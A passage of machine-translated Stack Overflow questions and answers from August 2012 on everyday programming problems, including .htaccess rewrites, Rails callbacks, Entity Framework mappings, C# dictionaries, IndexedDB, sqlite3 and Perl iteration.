我还考虑过检查 uri 段。如果它存在，则只有 404，但即使该段不存在。就 CI 而言，就好像额外的字符串甚至不存在一样。

希望我没有错过任何东西。如果您需要更多示例代码，请随时说。

感谢您阅读并希望有人可以帮助并解释为什么会发生这种情况。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T18:07:52.167

.htaccess 文件由于**#Forces WWW**部分而强制更改 url，这会导致您的子域路由中断。（我假设）

尝试更改行：

```
# Forces WWW
RewriteCond %{HTTP_HOST} !^www\.
RewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L] 
```

到：

```
# Forces WWW
RewriteCond %{HTTP_HOST} !^(www|subdomain)\.
RewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L] 
```

此外，由于您使用的是 301 重定向（对于开发环境，您需要将其更改为 R=302），您可能仍会被重定向，因为您的浏览器已经缓存了 301。在另一个您没有使用过的浏览器上测试几天，或清除您当前的浏览器缓存。

**再看一眼，考虑到您已经强制执行多少重定向，尾部斜杠部分也可能会导致您的 Chrome 浏览器出现问题。我之前在 CI 中遇到过这种情况，添加/删除斜杠会导致 Chrome 将页面标记为可能是恶意的

# php - 强制 $_POST 列出所有字段，即使该字段不包含数据/值

> ID：11782927
> 
> 赞同：0
> 
> 时间：2012-08-02T17:42:08.850
> 
> 标签：php

我有一个名为“holds”的多选下拉字段。

未选择任何内容时，保留名称不会显示在 $_POST

$_POST 数组中显示的唯一字段是被选中的字段或在文本字段中有数据的字段。

如何强制 $_POST 列出所有输入字段（无论它们是否包含数据）？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-02T17:43:05.140

如果浏览器不将值发送到服务器，`$_POST`则不会包含它。时期。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:50:34.920

问题不在于 POST，而在于原始表单字段。如果浏览器没有某个值（即使该值是空白的），那么它不会随请求一起提交输入。在服务器端对此无能为力。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T17:53:58.923

这可能会浪费空间，但您可以发送带有附加字段的帖子，该字段是帖子字段的序列化数组（有或没有数据）。

-只是一个想法

# ruby-on-rails-3 - 带有 URL 参数的 Rails link_to 操作

> ID：11782935
> 
> 赞同：0
> 
> 时间：2012-08-02T17:43:06.667
> 
> 标签：ruby-on-rails-3, rails-routing, link-to

如果我有这样的路线

```
get 'controller/:id/action/:param' => 'Controller#action' 
```

如何使用`link_to`创建链接`<a href="/controller/12345/action/abcde">`？

到目前为止我已经得到`link_to 'Link text', {:action => 'action'}`

给我`<a href="/controller/12345/action">`

但使用`link_to 'Link text', {:action => 'action', :param => 'abcde'}`

会给我`<a href="/controller/12345/action?param=abcde">`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:54:39.453

您可以命名您的路线：

```
get 'controller/:id/action/:param' => 'Controller#action', :as => 'custom_show' 
```

这应该会给你一个新的 url 助手，你可以像这样使用它：

```
<%= link_to "Foobar", custom_show_path(:id=>1234, :param=>'my_param') %> 
```

# yii - FullCalendar Yii 模块：MainController.php 中的 actionList 函数

> ID：11782938
> 
> 赞同：1
> 
> 时间：2012-08-02T17:43:12.970
> 
> 标签：yii, fullcalendar, yii-extensions

我试图了解 $start 和 $end 变量如何/在何处传递给 FullCalendar Yii 模块的 MainController.php 脚本中的 actionList 函数：

[http://www.yiiframework.com/extension/cal/](http://www.yiiframework.com/extension/cal/)

[http://arshaw.com/fullcalendar/](http://arshaw.com/fullcalendar/)

```
public function actionList($start = 0, $end = 0)
{
    if ((Yii::app()->request->isAjaxRequest) and (Yii::app()->user->hasState('calUserId')) )
    {
        $criteria = new CDbCriteria(array(
                    'condition' => 'user_id=:user_id',
                    'params'=>array(':user_id'=> Yii::app()->user->getState('calUserId')),
                ));
        $criteria->addBetweenCondition('start', $start, $end);
        $events = Event::model()->findAll($criteria);
        echo CJSON::encode($events);
        Yii::app()->end();
    }
} 
```

这是否来自 fullcalendar.min.js 脚本？它似乎被调用的唯一地方是在 eventCal.js 中：

```
var defaultCalendarOptions = {
        events: params.baseUrl+'list', 
```

变量是否曾经使用 Yii 模块传入，或者它们总是 $start=0,$end=0？如果他们通过了，请解释如何...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T20:20:56.823

`$start`和`$end`变量实际上`$_GET`是传递给方法的参数`actionList`。Yii 框架经常这样做——如果一个动作方法有参数，它会寻找`$_GET`同名的参数并传递这些参数。

您很好地假设该`events: params.baseUrl+'list'`行用于此目的，但发送 GET 请求的实际代码段深埋在 fullcalendar.js 文件中：

```
$.ajax($.extend({}, ajaxDefaults, source, {
    data: data,
    ... 
```

在这段代码中，`source`是`events`上面的参数，它被传递给实际的完整日历脚本，并且是一个带有和参数`data`的数组。[您可以在此处](http://arshaw.com/js/fullcalendar-1.5.3/fullcalendar/fullcalendar.js)找到脚本的完整源代码。您使用的扩展只有缩小版。`start``end`

# c# - 覆盖多对多关系的代码优先命名约定

> ID：11782941
> 
> 赞同：0
> 
> 时间：2012-08-02T17:43:15.543
> 
> 标签：c#, entity-framework, many-to-many

我有 2 个具有多对多关系的实体，它们不遵循代码优先命名约定，我必须找到一种方法来覆盖它。

第一个实体：

```
public class User  
{
    public int UserId { get; set; }
    public string Username { get; set; }
    public virtual ICollection<Rule> { get; set; }
} 
```

第二个实体：

```
public class Rule  
{
    public int RuleId { get; set; }
    public string Description { get; set; }
    public virtual ICollection<User> { get; set; }
} 
```

我在这两个之间有一个带有经典映射的表（名称是由 2 个列（ ）和相应的外键`UserRule`组成的复合主键）`UserId, RuleId`

我使用的 dbcontext 是这个：

```
public class DataContext : DbContext
{
    public IDbSet<User> Users { get; private set; }
    public IDbSet<Rule> Rules { get; private set; }

    private const string ConnectionStringName = "connectionstring";

    public DataContext() : base(ConnectionStringName)
    {
        Configuration.LazyLoadingEnabled = true;

        Rules = Set<Rule>();
        Users = Set<User>();
    }

    protected override void OnModelCreating(DbModelBuilder builder)
    {
        // use this to disable database migrations and not use metadata inside database
        Database.SetInitializer<DataContext>(null);

        // setup MaestroAgentConfig to its table
        builder.Configurations.Add(new UserTable());

        // setup SecurityRule to its table
        builder.Configurations.Add(new RuleTable());

        base.OnModelCreating(builder);
    }

    public override int SaveChanges()
    {
        return base.SaveChanges();
    }
} 
```

我拥有的映射表是：

```
public class UserTable : EntityTypeConfiguration<User>
{
    public UserProfileTable()
    {
        Property(x => x.UserId).HasColumnName("UserId").HasDatabaseGeneratedOption(DatabaseGeneratedOption.Identity);
        HasMany(x => x.SecurityRules)
            .WithMany(x => x.UserProfiles)
            .Map(map =>
            {
                map.MapRightKey("UserId");
                map.MapRightKey("RuleId");
                map.ToTable("UserRule");
            });
        ToTable("User");
    }
} 
```

和 ：

```
public class RuleTable : EntityTypeConfiguration<Rule>
{
    public RuleTable()
    {
        Property(x => x.RuleId).HasColumnName("RuleId").HasDatabaseGeneratedOption(DatabaseGeneratedOption.Identity);
        HasKey(x => x.RuleId);
        ToTable("Rule");
    }
} 
```

然而，当 EF 查询数据库时，它看起来像这样：

```
exec sp_executesql N'
SELECT TOP (1) 
    [Extent1].[UserId] AS [UserId], 
    { other fields }
FROM 
    [dbo].[UserProfile] AS [Extent1]
WHERE 
    [Extent1].[UserName] = @p__linq__0',N'@p__linq__0 nvarchar(4000)',@p__linq__0=N'EMYODE\erick.girard' 
```

和 ：

```
exec sp_executesql N'
SELECT 
    [Extent2].[RuleId] AS [RuleId], 
    [Extent2].[Description] AS [Description]
FROM  
    [dbo].[UserRule] AS [Extent1]
INNER JOIN 
    [dbo].[Rule] AS [Extent2] ON [Extent1].[RuleId] = [Extent2].[RuleId]
WHERE 
    [Extent1].[User_UserId] = @EntityKeyValue1',N'@EntityKeyValue1 int',@EntityKeyValue1=37 
```

现在在第二个请求中，我找不到`UserId`仅在`UserRule`桌子上使用“”的方法

我怎样才能做到这一点？

（编辑）我尝试删除以下 3 个约定，但到目前为止它没有改变任何东西：

```
builder.Conventions.Remove<PluralizingEntitySetNameConvention>();
builder.Conventions.Remove<NavigationPropertyNameForeignKeyDiscoveryConvention>();
builder.Conventions.Remove<TypeNameForeignKeyDiscoveryConvention>(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T20:05:18.800

您的代码是精确副本还是伪代码？

准确地粘贴您的代码，我得到了相同的结果 -

但是，您将映射表的右侧部分映射两次：

```
map.MapRightKey("UserId");
map.MapRightKey("RuleId"); 
```

我将顶部命令更改为映射到左键

```
map.MapLeftKey("UserId");
map.MapRightKey("RuleId"); 
```

并为我修好了。

# android - 如何在没有启动器图标的情况下启动应用程序？

> ID：11782943
> 
> 赞同：0
> 
> 时间：2012-08-02T17:43:24.497
> 
> 标签：android

我想在没有 Launchericon 的情况下启动 Activity。所以我删除了

```
<category android:name="android.intent.category.LAUNCHER" /> 
```

从清单。现在我的图标没有出现在启动器中，但我的应用程序第一次启动，此后用户不需要打开应用程序（因此不需要启动器图标）。

所以我的问题是：有没有办法不显示启动器图标，而是第一次启动应用程序？

谢谢你。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T17:52:13.400

> 在此之后，用户不需要打开应用程序（因此不需要启动器图标）

如果他们强制停止您的应用程序，他们将需要返回并从启动器启动您的一项活动，或者以其他方式导致某些东西显式运行您的一个组件。否则，您的应用将永远无法再次运行（Android 3.1+）。

此外，您需要一个始终可用的活动：

*   您的应用程序的设置（控制您的应用程序提供的任何其他内容的行为）
*   许可协议
*   隐私政策
*   文件
*   有关从何处获得应用支持的信息
*   等等

因此，我强烈建议您在应用程序的启动器中进行有意义的活动。

`setComponentEnabledSetting()`话虽如此，您可以通过调用on禁用您的活动，从而使其停止出现在启动器中`PackageManager`。

# c# - 访问 C# 字典

> ID：11782944
> 
> 赞同：-1
> 
> 时间：2012-08-02T17:43:26.217
> 
> 标签：c#, dictionary

我有一个颜色字典，如下所示。

```
Dictionary<string, List<System.Drawing.Color>> channelColorInformation = 
    new Dictionary<string, List<System.Drawing.Color>>();

List<System.Drawing.Color> colorInfo = new List<System.Drawing.Color>();

System.Drawing.Color color = System.Drawing.ColorTranslator.FromHtml("#FFF0F8FF");
colorInfo.Add(color);
color = System.Drawing.ColorTranslator.FromHtml("#FFFAEBD7");
colorInfo.Add(color);
color = System.Drawing.ColorTranslator.FromHtml("#FF00FFFF");
colorInfo.Add(color);
channelColorInformation.Add("Channel1", colorInfo); 
```

如何`System.Drawing.Color`从字典中获取`Channel1`索引 0、1、2 的信息？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T17:46:56.397

有两种不同的选项，具体取决于字典中缺少条目是否错误。如果这代表一个错误，您可以使用索引器获取它：

```
List<Color> colors = channelColorInformation["Channel1"];
// Access the list in the normal way... either with an indexer (colors[0])
// or using foreach 
```

如果键“Channel1”没有条目，这将引发异常。

否则，使用[`TryGetValue`](http://msdn.microsoft.com/en-us/library/bb347013.aspx)：

```
List<Color> colors;
if (channelColorInformation.TryGetValue("Channel1", out colors))
{
    // Use the list here
}
else
{
    // No entry for the key "Channel1" - take appropriate action
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T17:46:17.790

像这样的东西：

```
List<Color> listForChannel1 = channelColorInformation["Channel1"];
Color c1 = listForChannel1[0];    
Color c2 = listForChannel1[2];    
Color c3 = listForChannel1[3]; 
```

**更新**

@Jon 的回答也很重要，因为它显示了两个选项来处理字典中不存在密钥的可能性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:46:07.080

```
var result = channelColorInformation["Channel1"] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T17:47:27.853

每个列表元素都是一个`List<Color>`实例，因此您可以使用[索引器](http://msdn.microsoft.com/en-us/library/0ebtbkkc.aspx)访问单个项目：

```
List<Color> channel = channelColorInformation["Channel1"];
Color index0 = channel[0];
Color index1 = channel[1];
// etc. 
```

# google-chrome - 在 Google Chrome 21 问题中删除 indexeddb 数据库时出错

> ID：11782946
> 
> 赞同：2
> 
> 时间：2012-08-02T17:43:47.180
> 
> 标签：google-chrome, indexeddb

从今天开始，当我尝试在 Google Chrome 版本 21 中删除 IndexedDB 数据库时，我开始遇到错误。当我运行删除数据库的命令时：

```
window.webkitIndexedDB.deleteDatabase(dbName); 
```

以下事件触发：

```
IDBVersionChangeEvent
bubbles: false
cancelBubble: false
cancelable: false
clipboardData: undefined
currentTarget: IDBVersionChangeReques
defaultPrevented: false
eventPhase: 2
returnValue: true
srcElement: IDBVersionChangeRequest
target: IDBVersionChangeRequest
timeStamp: 1343929274696
type: "blocked"
version: "" 
```

附加信息：我正在从网络工作者和窗口访问 IndexedDB。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-03T00:00:54.460

这意味着在某处存在与该数据库的开放连接。它可能位于与调用 deleteDatabase 的选项卡不同的选项卡中。该连接收到一个 versionchange 事件，通知它已调用 deleteDatabase 并且它需要关闭。

您可以在打开数据库时添加这样的处理程序：

```
request = indexeddb.open("dbname");
request.onsuccess = function(event) {
  db = event.target.result;
  db.onversionchange = function(event) {
    event.target.close();
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-06T13:06:39.287

问题在于从网络工作者访问数据库。在这行代码中：

```
database.close();//closing the database
self.close();//closing the web worker 
```

如果关闭数据库需要比平时更多的时间并且您关闭了 Web Worker，那么 Google chrome 中可能存在一些错误，然后当您之后尝试删除它时数据库被锁定。

我通过不关闭网络工作者并让它保持空闲模式来解决问题。

# automapper - AutoMapper 多对多关系到集合中

> ID：11782948
> 
> 赞同：6
> 
> 时间：2012-08-02T17:44:08.207
> 
> 标签：automapper

我正在尝试使用 AutoMapper 通过多对多表将实体映射到集合中。

我的域模型（实体框架）如下所示：

```
public class User
{
    public int UserID { get; set; }
    public string Name { get; set; }        
    public IList<UserCompany> UserCompanies { get; set; }
}

public class Company
{
    public int CompanyID { get; set; }
    public string Name { get; set; }
}

public class UserCompany
{
    public int UserCompanyID { get; set; }
    public int UserID { get; set; }
    public int CompanyID { get; set; }
} 
```

我正在尝试映射到一个看起来像这样的类：

```
public class CompanyDTO
{
    public int CompanyID { get; set; }
    public string Name { get; set; }
}

public class UserDTO
{
    public int UserID { get; set; }
    public string Name { get; set; }
    public IList<CompanyDTO> Companies { get; set; }
} 
```

我当前的映射配置如下所示：

```
Mapper.CreateMap<Company, CompanyDTO>(); //works no problem

Mapper.CreateMap<User, UserDTO>()
    .ForMember( dto => dto.Companies,
    opt => opt.MapFrom(x => Mapper.Map<IList<Company>, IList<CompanyDTO>>(x.UserCompanies.Select( y => y.Company ).ToList()))); 
```

断言配置有效返回 true，但是当我尝试将用户实际映射到 UserDTO 时，我得到：主体的签名和方法实现中的声明不匹配。

如果我使用 AfterMap 并手动将每个公司移动到公司列表中，它将起作用，但似乎我应该能够在创建地图中处理这个问题。

在我从数据库中获取单个用户的查询中，我包含了 UserCompany.Company 导航属性，我可以快速查看并查看是否有返回。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-02T19:12:14.300

您不需要在映射配置中有显式映射。您应该能够执行以下操作：

```
Mapper.CreateMap<User, UserDTO>()
    .ForMember(dto => dto.Companies, opt => opt.MapFrom(x => x.UserCompanies)); 
```

您还需要为 UserCompany 定义一个映射：

```
Mapper.CreateMap<UserCompany, CompanyDTO>(); 
```

请注意，您的示例中没有 CompanyDTO 类，因此我无法确定实际的映射配置。

**更新**

我认为您在用户实体中需要 IList 而不仅仅是 IList 是有原因的。鉴于此，我相信您需要一个自定义解析器：[https ://github.com/AutoMapper/AutoMapper/wiki/Custom-value-resolvers](https://github.com/AutoMapper/AutoMapper/wiki/Custom-value-resolvers)

**更新 2**

我很高兴你把它整理好了。为了完整起见，如果您决定将自定义 ValueResolver 与上述类一起使用，那么下面是示例。

```
Mapper.CreateMap<Company, CompanyDTO>();
Mapper.CreateMap<User, UserDTO>()
    .ForMember(dto => dto.Companies, opt => opt.ResolveUsing<CompanyResolver>());
Mapper.AssertConfigurationIsValid(); 
```

CompanyResolver 类似于

```
public class CompanyResolver : ValueResolver<User, IList<CompanyDTO>>
{
    protected override IList<CompanyDTO> ResolveCore(User source)
    {
        return source.UserCompanies
            .Select(userCompany =>
                    Mapper.Map<Company, CompanyDTO>(companies.FirstOrDefault(x => x.CompanyID == userCompany.CompanyID)))
            .ToList();
    }
} 
```

# terminology - 什么是霰弹枪/巫毒编程？

> ID：11782951
> 
> 赞同：19
> 
> 时间：2012-08-02T17:44:24.280
> 
> 标签：terminology

我[在这个问题](https://workplace.stackexchange.com/questions/2992/in-an-exit-interview-how-do-i-tell-my-manager-about-my-replacements-lack-of)中看到了这个词。我想我有一个想法，但不确定这是一个本地化术语还是该术语的广泛意义。

Shotgun 会暗示他可能（过度）使用了一种比找到的更简单、更优雅的解决方案更笨重或更笨重的工具或技术。还有巫毒？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-08-02T17:47:47.377

*霰弹枪*意味着盲目地将一百万小块垃圾散布在一个问题上，就像霰弹枪弹壳中的弹丸一样；希望一点点达到目标。它是在尝试一些东西，直到某些东西起作用，而不是了解正在发生的事情。

*Voodoo*暗示因为魔法信仰而做某事，或者更具体地说，出于未知原因而做某事，尤其是一些过于复杂的事情：“我一直这样做，我不知道为什么会这样。”

这两种描述都不讨人喜欢：它们暗示着无知和无能。

# objective-c - 在 WebView 中滚动

> ID：11782959
> 
> 赞同：0
> 
> 时间：2012-08-02T17:45:06.680
> 
> 标签：objective-c, macos, webview, scroll

我试图以编程方式滚动我的 WebView，但它对我不起作用。我在.h中的代码：

```
@interface AppDelegate : NSObject <NSApplicationDelegate> {
IBOutlet WebView*browser;
} 
```

和我在 .m 中的代码：

```
- (IBAction)scrollAction:(id)sender {
[[[browser enclosingScrollView] contentView] scrollToPoint:NSMakePoint(40, 340)];
} 
```

我为 Mac OS 而不是 iOS 制作了这个应用程序。如果有帮助，我为 iOS 编写了相同的代码，并且该代码在那里工作：

```
[browser.scrollView setContentOffset:CGPointMake(40, 340) animated:NO]; 
```

我该怎么做，当按下按钮时，我会跳转到 40、340 点？

# iphone - 为什么 sqlite3_prepare_v2 == FALSE？

> ID：11782960
> 
> 赞同：0
> 
> 时间：2012-08-02T17:45:33.337
> 
> 标签：iphone, sqlite, xcode4.3

不知道为什么 sqlite3_prepare_v2 等于 false。我在网上搜索并找不到太多，我找到的也没有帮助。一个站点建议使用 sqlite3_errmsg(database) 并且由于某种原因输出“不是错误”。另一个在线答案建议删除 iPhone 模拟器中以十六进制字符串命名的文件夹，但这也不起作用。我创建了我的数据库并放入了支持文件文件夹，所以它在那里并且有记录。

这是我的代码：

```
-(void)readMovesFromDatabaseWithPath:(NSString *)filePath
{
    sqlite3 *database;

    printf("Here in readMovesFromDatabaseWithPath\n");

    if(sqlite3_open([filePath UTF8String], &database) == SQLITE_OK)
    {
        NSLog(@"Now in readMovesFromDatabaseWithPath\n");

        const char *sqlStatement = "select * from moves";
        sqlite3_stmt *compiledStatment;

        printf( "could not prepare statemnt: %s\n", sqlite3_errmsg(database) ); //returns "not an error"

        if(sqlite3_prepare_v2(database, sqlStatement, -1, &compiledStatment, NULL) == SQLITE_OK)
        {
            NSLog(@"In sqlite3_prepare_v2 block\n"); //does not reach this line

            while(sqlite3_step(compiledStatment) == SQLITE_ROW) //Loops through the database
            {
                //Extracts the move's name
                NSString *moveName = [NSString stringWithUTF8String:(char *) sqlite3_column_text(compiledStatment, 1)];

                //Extracts the move's description
                NSString *moveDescription = [NSString stringWithUTF8String:(char *) sqlite3_column_text(compiledStatment, 2)];

                //Creates new move objects
                Moves *newMove = [[Moves alloc] init];
                newMove.moveName = moveName;
                newMove.moveDescription = moveDescription;
                [self.moves addObject:newMove];
            }
        }

        sqlite3_finalize(compiledStatment);
    }
    sqlite3_close(database);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-25T08:56:24.577

您没有将您的 sqlStatement 分配给您的已编译状态。

```
const char *compiledStatment = [sqlStatement UTF8String]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-03T02:45:30.297

尝试将打印错误的语句移动到 else 子句中。您的程序会告诉您失败的原因：

```
 if(sqlite3_prepare_v2(database, sqlStatement, -1, &compiledStatment, NULL) == SQLITE_OK)
    {
       /* your code here */
    }
    else
    {
        printf( "could not prepare statemnt: %s\n", sqlite3_errmsg(database) );
    } 
```

最可能的情况是该表`moves`不存在。

# arrays - 如何遍历 Perl 中的数组哈希？

> ID：11782961
> 
> 赞同：0
> 
> 时间：2012-08-02T17:45:33.560
> 
> 标签：arrays, perl, hash, iteration

我有以下结构（实际上，它要大得多）：

```
$param_hash = {
          'param1' => [0, 1],
          'param2' => [0, 1, 2],
          'param3' => 0,
        }; 
```

我想在该行中打印不同参数的所有可能组合，如下所示：

```
param1='0' param2='0' param3='0'
param1='0' param2='1' param3='0'
param1='0' param2='2' param3='0'
... 
```

我知道需要一个迭代（比如[这个](https://stackoverflow.com/questions/2363142/how-to-iterate-through-hash-of-hashes-in-perl)），但我就是无法让它工作。我该怎么做？
或者也许我应该使用另一个结构来存储参数值范围？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-02-27T17:26:36.600

此解决方案假定参数排序无关紧要，只要涵盖所有情况。如果对您的问题很重要，我认为 CPAN 有一些有序的散列。

```
use strict;

my %KNOBS = (ARG1=>[1,2,3],
             ARG2=>['a','b'],
             ARG3=>['41:R']);

my %indicies;
foreach my $keys (keys %KNOBS)
{
  $indicies{$keys}=0;
}

my @orderedkeys = (keys %KNOBS);

printknobs();
while(incrimentindicies())
{
  printknobs();
}

sub printknobs
{
  foreach (@orderedkeys)
  {
    print "-$_ $KNOBS{$_}[$indicies{$_}] "; #num elements in array $key of %knob
  }
  print "\n";
}

sub incrimentindicies
{
  foreach (@orderedkeys)
  {
    if( $indicies{$_} + 1 < @{$KNOBS{$_}})
    {
      $indicies{$_} = $indicies{$_} + 1;
      return 1;
    }else{
      $indicies{$_} = 0;
    }
  }
  return 0;
} 
```

输出：

```
-ARG2 a -ARG3 41:R -ARG1 1
-ARG2 b -ARG3 41:R -ARG1 1
-ARG2 a -ARG3 41:R -ARG1 2
-ARG2 b -ARG3 41:R -ARG1 2
-ARG2 a -ARG3 41:R -ARG1 3
-ARG2 b -ARG3 41:R -ARG1 3 
```

`@orderedkeys`确保`%indicies`在调用`incrimentindicies`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T18:04:20.917

首先你必须在哈希键中找到最长的数组引用，像这样迭代

```
for my $value (0..$maxValue) {
    foreach my $key (sort keys %$param_hash) {

        unless (ref($param_hash->{$key}) eq 'ARRAY') {
            $param_hash->{$key} = [$param_hash->{$key}];
        }

        print "$key=", $#{$param_hash->{$key}} >= $value ? $param_hash->{$key}->[$value] : 0;
        print ' ';
    }
    print "\n";
} 
```

其中 maxValue 是可能的最长数组引用，在本例中为 2。这将按照您在问题中描述的方式对其进行格式化。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T18:15:28.353

```
foreach my $key (keys %$param_hash){
    if(ref $param_hash->{$key} eq 'ARRAY'){
        foreach my $value (@{$param_hash->{$key}}){
            print "$key = $ value ";
        }
    }
        else {
            print "$key = $param_hash->{$key} ";
        }
    print "\n"
    } 
```

# image - 如何在drupal commerce上将图像而不是文本放在产品显示上

> ID：11782964
> 
> 赞同：0
> 
> 时间：2012-08-02T17:45:45.447
> 
> 标签：image, drupal, commerce

有没有办法在drupal commerce上将图像而不是文本标题设置为我的产品显示标题，我的意思是主要在网站的首页上？甚至能够自定义产品展示？我是drupal commerce（commerce kickstart）的新手，我有点帮助会很好

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T19:32:46.320

产品展示是常规的 Drupal 节点（内容片段）。因此，您可以像显示任何节点类型一样自定义产品显示。转到结构»内容类型（/admin/structure/types）并为产品显示类型选择“管理显示”。在此管理显示页面上，您可以为每个可用和选定的视图模式（默认、完整节点、预告片等）自定义显示。

如果您在自定义视图模式的显示时需要更多选项，请查看[Display Suite 模块](http://drupal.org/project/ds)。Display Suite 将升级 Manage Display 页面，让您可以将布局添加到视图模式，Display Suite Extras 模块（包括在内，但必须单独启用）将让您执行高级操作，例如在显示中隐藏节点的标题。

# perl - 通过 Perl 更改 Bash 变量

> ID：11782965
> 
> 赞同：0
> 
> 时间：2012-08-02T17:45:51.843
> 
> 标签：perl, bash, command-line

我想使用一行 Perl 命令来更改 Bash 变量中的数据。我认为问题在于 Perl one liner 没有接收管道输入的数据。

我知道 bash 更改变量，即`findString=${findString//\//\\/}`

我也对让 Perl 工作感到好奇。我不知道 Perl，所以保持简单。

需要明确的是，这两行不起作用：我希望将文本中的选项卡更改为 \t。我希望将任何 Unix 行结尾更改为 \n。

```
findString=$(cat "${findString}" | perl -0777pe 's/\t/\\t/g')

findString=$(cat "${findString}" | perl -0777pe 's/\n/\\n/g') 
```

这是我的 bash 代码：

```
#!/bin/bash

#The idea here is to change tab to \n
# and line End to \n

# debug info
export PS4='+(${BASH_SOURCE}:${LINENO}):'

# trace all the lines
#set -o xtrace
echo "---------------------- start ----------------------------------------"

# string to change.
# chops off the last \n

read -d '' findString <<"EOFEOFEOF"
# Usage: /Users/mac/Sites/bithoist/commandLine/BitHoist/BitHoist-PPC-MacOS-X [options] input... < input > output
               # Options and inputs may be intermixed
    -stdin     # Use standard input as input file
    -offset nn # Offset next input file data by nn

EOFEOFEOF

findString=$(cat "${findString}" | perl -0777pe 's/\t/\\t/g')

findString=$(cat "${findString}" | perl -0777pe 's/\n/\\n/g')

echo "------------> findString of length ${#findString} is:"
echo -E "${findString}"
echo 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T18:15:14.923

它应该工作。

就是这样

```
$ echo Helloabtb | perl -0777pe 's/a/x/g'
Helloxbtb
$ myvar=`echo Helloabtb | perl -0777pe 's/a/x/g'`
$ echo $myvar
Helloxbtb 
```

因此，如果它适用于`echo`它应该适用于`cat`. 我建议在我的示例中使用如上所示的反引号，然后尝试。就像是

```
 findString=`cat $findString | perl -0777pe 's/\t/\\t/g'` 
```

也很可能`cat`需要一个文件。所以在你的情况下`echo`可能适合

```
findString=`echo $findString | perl -0777pe 's/\t/\\t/g'` 
```

或者

```
findString=$(echo "$findString" | perl -0777pe 's/\t/\\t/g') 
```

或者

```
command="echo $findString | perl -0777pe 's/\t/\\t/g'"
findString=eval($command) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T20:37:29.483

正如@chepner 在他的评论中已经指出的那样，您想使用`echo`而不是`cat`. `cat`期望 cat 的文件名，因此它被视为`$findString`文件名。

# ruby-on-rails-3 - Rails：如何使用 before_save 根据另一个字段更改字段值？

> ID：11782969
> 
> 赞同：20
> 
> 时间：2012-08-02T17:46:07.413
> 
> 标签：ruby-on-rails-3, activerecord

我正在尝试根据另一个布尔字段的值将布尔字段设置为 false。我使用 ActiveRecord 模型尝试了以下操作：

```
 before_save :reconcile_xvent

  def reconcile_xvent
    self.xvent_hood = false if !self.xvent_plenum?
  end 
```

但这不起作用。现在，我的许多单元测试都失败了：

```
ActiveRecord::RecordNotSaved: ActiveRecord::RecordNotSaved 
```

如果 xvent_plenum 为假，我如何将 xvent_hood 设置为假？

**更新**

这是有效的（其中一些来自下面的评论/答案）：

```
before_validation :reconcile_xvent

def reconcile_xvent
  if self.xvent_hood?
    self.xvent_hood = false unless xvent_plenum?
  end
end 
```

如果没有“if self.xvent_hood?”，我无法弄清楚如何让它工作。部分....

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-08-02T17:53:39.723

`before_save`仅在验证通过后调用**。**你需要做的是`reconcile_xvent`向上移动`before_validation`而不是`before_save`

如果您保留该方法，`before_save`将发生的事情是它认为该`xvent_hood`方法为空，如果您有一个检查其是否为空的验证，`xvent_hood`它将在`before_save`被调用之前失败。这可能解释了为什么你会`RecordNotSaved`出错。

要记住的另一件事是，如果你有一个布尔属性，你也不能使用`validate_presence_of`. 见[http://alexanderwong.me/post/16084280769/rails-validate-presence-of-boolean-and-arrays-mongoid](http://alexanderwong.me/post/16084280769/rails-validate-presence-of-boolean-and-arrays-mongoid)

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2012-10-23T04:53:18.773

我也遇到了这个问题，第一个代码块的问题是您将`xvent_hood`值分配给 false 然后由 before_save 方法返回。

按照

> **取消回调**
> 
> 如果 before_* 回调返回 false，则所有后面的回调和相关操作都将被取消。如果 after_* 回调返回 false，则后面的所有回调都将被取消。回调通常按照定义的顺序运行，但定义为模型上的方法的回调除外，这些方法最后调用。

来自[http://api.rubyonrails.org/classes/ActiveRecord/Callbacks.html](http://api.rubyonrails.org/classes/ActiveRecord/Callbacks.html)

# c++ - 我该怎么做才能获得在编译器优化代码中调用的函数？

> ID：11782973
> 
> 赞同：4
> 
> 时间：2012-08-02T17:46:22.843
> 
> 标签：c++, ios, optimization, compilation, llvm

我正在使用 Apple LLVM 4.0 进行 ios 项目编译并进行优化。我实现了一个函数的两个不同版本，一个在 C 中，一个在 NEON 中。我想测试他们的表现。我的想法是将它们都调用相同的时间，然后在 Time Profiler 中查找它们以查看每个花费的相对时间。最初我的代码看起来像

```
used_value = score_squareNEON(patch, image, current_pos);
used_value = score_squareC(patch, image, current_pos); 
```

当我分析时间时，NEON 代码根本没有出现。接下来我尝试了

```
for(int i = 0; i < successively_bigger_numbers; i++)
{
    used_value = score_squareNEON(patch, image, current_pos);
{
used_value = score_squareC(patch, image, current_pos); 
```

NEON 代码仍然没有贡献。接下来是

```
used_value = score_squareNEON(patch, image, current_pos);
test = score_squareC(patch, image, current_pos); 
```

